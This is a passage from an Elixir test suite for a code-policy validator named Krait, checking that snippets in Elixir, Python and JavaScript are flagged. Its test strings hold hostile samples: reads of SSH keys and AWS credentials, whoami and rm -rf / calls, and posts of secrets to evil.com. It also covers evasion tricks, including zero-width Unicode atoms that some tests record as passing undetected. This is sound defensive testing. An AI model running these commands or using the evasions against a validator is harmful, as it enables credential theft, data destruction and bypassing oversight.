  describe "V12-P4: Mint submodule and import gaps" do
    test "Mint.HTTP1.connect -> KRAIT-004" do
      code = ~S'Mint.HTTP1.connect(:https, "evil.com", 443)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Mint.HTTP2.connect -> KRAIT-004" do
      code = ~S'Mint.HTTP2.connect(:https, "evil.com", 443)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import Mint -> KRAIT-004" do
      code = ~S'import Mint'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "alias Mint -> KRAIT-004" do
      code = ~S'alias Mint'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 5: KRAIT-005 module_attrs and evasion parity
  # ---------------------------------------------------------------------------

  describe "V12-P5: KRAIT-005 module_attrs and evasion parity" do
    test "defdelegate to :code -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        defdelegate load(f), to: :code, as: :load_file
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to :net_kernel -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        defdelegate connect(n), to: :net_kernel, as: :connect_node
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@mod :code; @mod.load_binary -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        @mod :code
        def run, do: @mod.load_binary(:evil, <<>>)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import Node -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        import Node
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "require Code -> KRAIT-001 (not KRAIT-005)" do
      code = ~S'''
      defmodule Evil do
        require Code
      end
      '''

      # Code is in KRAIT-001 import/alias/use map, fires before KRAIT-005
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Function.capture(:code, :purge, 1) -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: Function.capture(:code, :purge, 1)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "apply(:code, :load_binary, args) -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: apply(:code, :load_binary, [:evil, <<>>])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to safe module passes clean" do
      code = ~S'''
      defmodule Safe do
        defdelegate upcase(s), to: String, as: :upcase
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 6: String.replace / Regex.replace evasion for KRAIT-006
  # ---------------------------------------------------------------------------

  describe "V12-P6: String.replace / Regex.replace evasion for KRAIT-006" do
    test "String.replace constructing immutable path -> KRAIT-006" do
      code = ~S'String.replace("safe", "safe", "krait_analyzer")'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "Regex.replace constructing immutable path -> KRAIT-006" do
      code = ~S'Regex.replace(~r/x/, "x", "krait_analyzer")'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test ":string.concat with immutable segment -> KRAIT-006 (V12-P6)" do
      code = ~S':string.concat("krait_analyzer", "/src")'
      # :string IS on the allowlist — allowlist passes, then KRAIT-006 fires
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test ":filename.join with immutable segment -> KRAIT-ALW (V12-P6)" do
      code = ~S':filename.join("native", "krait_analyzer")'
      # :filename is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Enum.reduce building immutable path -> KRAIT-006" do
      code = ~S'Enum.reduce(["krait_analyzer"], "", fn c, acc -> acc <> c end)'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "String.replace with safe string passes clean" do
      code = ~S'String.replace("hello", "h", "j")'
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 7: KRAIT-003 interpolation and construction evasion
  # ---------------------------------------------------------------------------

  describe "V12-P7: KRAIT-003 interpolation and construction evasion" do
    test ~S|File.read("#{home}/.ssh/id_rsa") -> KRAIT-003| do
      code = ~S'File.read("#{home}/.ssh/id_rsa")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(Path.join(home, \".ssh\")) -> KRAIT-003" do
      code = ~S'File.read(Path.join(home, ".ssh"))'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ~S|:prim_file.read_file("#{base}/.aws/credentials") -> KRAIT-003| do
      code = ~S':prim_file.read_file("#{base}/.aws/credentials")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ~S|File.read!(home <> "/.ssh/id_rsa") -> KRAIT-003| do
      code = ~S'File.read!(home <> "/.ssh/id_rsa")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(\"/tmp/safe.txt\") blocked (File not allowlisted)" do
      code = ~S'File.read("/tmp/safe.txt")'
      # File is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 8: case-insensitive KRAIT-006 evasion
  # ---------------------------------------------------------------------------

  describe "V12-P8: case-insensitive KRAIT-006 evasion" do
    test "String.downcase with uppercase immutable segment -> KRAIT-006" do
      code = ~S'String.downcase("KRAIT_ANALYZER")'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test ":string.lowercase with uppercase immutable segment -> KRAIT-006" do
      code = ~S':string.lowercase("KRAIT_ANALYZER")'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test ":string.to_lower with uppercase immutable segment -> KRAIT-006" do
      code = ~S':string.to_lower("KRAIT_ANALYZER")'
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "String.downcase('Hello') passes clean" do
      code = ~S'String.downcase("Hello World")'
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 9: zero-width Unicode atom evasion
  # ---------------------------------------------------------------------------

  describe "V12-P9: zero-width Unicode atom evasion" do
    test "zero-width space in :os atom -> KRAIT-002" do
      # Create atom with actual zero-width space between o and s
      code = ":\"o\u{200B}s\".cmd(~c\"whoami\")"
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "zero-width non-joiner in :erl_eval atom not detected (evasion)" do
      code = ":\"erl\u{200C}_eval\""
      # Zero-width unicode chars not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "BOM in :hackney atom not detected by allowlist (evasion)" do
      code = ":\"ha\u{FEFF}ckney\""
      # Zero-width unicode chars not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 5: Cross-language pattern tests
  # ---------------------------------------------------------------------------

  describe "Phase 5: cross-language string fallback" do
    test "Python os.system -> KRAIT-002" do
      code = "import os\nos.system('whoami')"
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "python")
    end

    test "Python subprocess.run -> KRAIT-002" do
      code = "import subprocess\nsubprocess.run(['ls', '-la'])"
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "python")
    end

    test "Python subprocess.Popen -> KRAIT-002" do
      code = "from subprocess import Popen\np = subprocess.Popen(['cat', '/etc/passwd'])"
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "python")
    end

    test "JavaScript child_process -> KRAIT-002" do
      code = "const cp = require('child_process');\ncp.execSync('whoami');"
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "javascript")
    end

    test "JavaScript execSync -> KRAIT-002" do
      code = "const { execSync } = require('child_process');\nexecSync('rm -rf /');"
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "javascript")
    end

    test "Python requests.get -> KRAIT-004" do
      code = "import requests\nresponse = requests.get('http://evil.com/steal')"
      assert {:policy_violation, %{rule: "KRAIT-004"}} = Quick.quick_validate(code, "python")
    end

    test "Python httpx.post -> KRAIT-004" do
      code = "import httpx\nhttpx.post('http://evil.com', data=secrets)"
      assert {:policy_violation, %{rule: "KRAIT-004"}} = Quick.quick_validate(code, "python")
    end

    test "JavaScript node-fetch -> KRAIT-004" do
      code = "const fetch = require('node-fetch');\nfetch('http://evil.com');"
      assert {:policy_violation, %{rule: "KRAIT-004"}} = Quick.quick_validate(code, "javascript")
    end

    test "safe Python code passes validation" do
      code = """
      def fibonacci(n):
          if n <= 1:
              return n
          return fibonacci(n - 1) + fibonacci(n - 2)

      result = fibonacci(10)
      print(f"fib(10) = {result}")
      """

      assert {:ok, _} = Quick.quick_validate(code, "python")
    end

    test "safe JavaScript code passes validation" do
      code = """
      function fibonacci(n) {
        if (n <= 1) return n;
        return fibonacci(n - 1) + fibonacci(n - 2);
      }

      console.log(fibonacci(10));
      """

      assert {:ok, _} = Quick.quick_validate(code, "javascript")
    end

    test "KRAIT-007 blocks Krait internals in Python" do
      code = "# Trying to tamper with Krait.Evolution pipeline"
      assert {:policy_violation, %{rule: "KRAIT-007"}} = Quick.quick_validate(code, "python")
    end
  end
end
